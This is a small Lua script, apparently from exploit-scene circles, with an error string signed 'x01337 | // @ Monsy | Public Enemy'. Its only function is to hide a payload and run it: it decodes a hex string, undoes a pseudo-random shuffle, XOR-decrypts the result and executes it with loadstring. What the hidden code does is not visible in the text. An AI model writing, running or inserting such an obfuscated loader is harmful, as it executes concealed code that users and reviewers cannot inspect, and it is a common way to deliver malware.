local qwFFqK9Ey6={"a465a9308f60f830d27ebbb639bdcd66ab36d0e0bd9df99fb09beb27e6b7a93da2be33d1886369f3ecf5b1e276f7bc934354aa326dedc79a23eaeeb955b8"}
local Gc26zxtm4VW=table.concat(qwFFqK9Ey6)
local qleU9CIlknt7j5U={}
for Zq8izD=1,#Gc26zxtm4VW,2 do
  qleU9CIlknt7j5U[#qleU9CIlknt7j5U+1]=tonumber(string.sub(Gc26zxtm4VW,Zq8izD,Zq8izD+1),16)
end
local MVh851x8LLc={200,152,66,49,216,68,75,139,14,239,153,158,238,218,181,201,133}
local DX6gFsaZoq=188972578
local pc7L6z0FnC={}
local TlusfpFPh=DX6gFsaZoq
for hVxi4h=#qleU9CIlknt7j5U-1,1,-1 do
  TlusfpFPh=(TlusfpFPh*1664525+1013904223)%4294967296
  local ob6zr8qGch=TlusfpFPh%(hVxi4h+1)+1
  pc7L6z0FnC[#pc7L6z0FnC+1]={hVxi4h+1,ob6zr8qGch}
end
for Zq8izD=#pc7L6z0FnC,1,-1 do
  fJWbX2p=pc7L6z0FnC[Zq8izD]
  local KpN_bfh=qleU9CIlknt7j5U[fJWbX2p[1]]
  qleU9CIlknt7j5U[fJWbX2p[1]]=qleU9CIlknt7j5U[fJWbX2p[2]]
  qleU9CIlknt7j5U[fJWbX2p[2]]=KpN_bfh
end
local y4qyN3mBNk99V={}
for Zq8izD=1,#qleU9CIlknt7j5U do
  y4qyN3mBNk99V[Zq8izD]=string.char(bit32.bxor(qleU9CIlknt7j5U[Zq8izD],MVh851x8LLc[(Zq8izD-1)%#MVh851x8LLc+1]))
end
local gOMqcdyj0KALi=table.concat(y4qyN3mBNk99V)
local gq7YuD0lsRQ,ZziHYD6n2=loadstring(gOMqcdyj0KALi)
if gq7YuD0lsRQ then
  gq7YuD0lsRQ()
else
  error(" x01337 | // @ Monsy | Public Enemy : "..tostring(ZziHYD6n2))
end